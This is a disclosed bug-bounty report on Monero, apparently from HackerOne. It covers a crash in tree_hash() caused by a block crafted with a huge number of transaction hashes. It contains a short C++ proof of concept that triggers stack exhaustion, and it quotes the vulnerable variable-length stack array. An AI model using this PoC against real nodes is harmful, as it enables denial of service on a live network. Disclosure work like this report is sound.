# [H] Computing hash of crafted block leads to crash in tree_hash()

## Summary
Severity: High
Program: Monero
Weakness: Uncontrolled Resource Consumption
Reporter: guido
State: resolved
Disclosed: 2019-07-03T00:11:28.656Z
Source: https://hackerone.com/reports/519120

## Details
I'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC:

```c
#include <cryptonote_basic/cryptonote_format_utils.h>

int main(void)
{
    cryptonote::block b = AUTO_VAL_INIT(b);
    for (size_t i = 0; i < 300000; i++) {
        b.tx_hashes.push_back({});
    }
    std::ostringstream oss;
    binary_archive<true> ba(oss);
    std::string s;
    if ( ::serialization::serialize(ba, b) == true ) {
        s = oss.str();
    } else {
        return 0;
    }

/* Uncomment to crash */
    cryptonote::block b2 = AUTO_VAL_INIT(b2);
    if ( parse_and_validate_block_from_blob(s, b2) == true ) {
        /* Crash */
        get_tx_tree_hash(b2);
    }
    return 0;
}
```

The reason this crashes is because of this code in ```tree_hash```:

```c
    char ints[cnt][HASH_SIZE];
    memset(ints, 0 , sizeof(ints));  // zero out as extra protection for using uninitialized mem
```

```ints``` is allocated on the stack, not on the heap. Its size is dynamic; ```cnt``` (derived from the number of ```tx_hashes``` in this example) multiplied by 32 (```HASH_SIZE```) is the amount of bytes reserved on the stack.
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/519120_
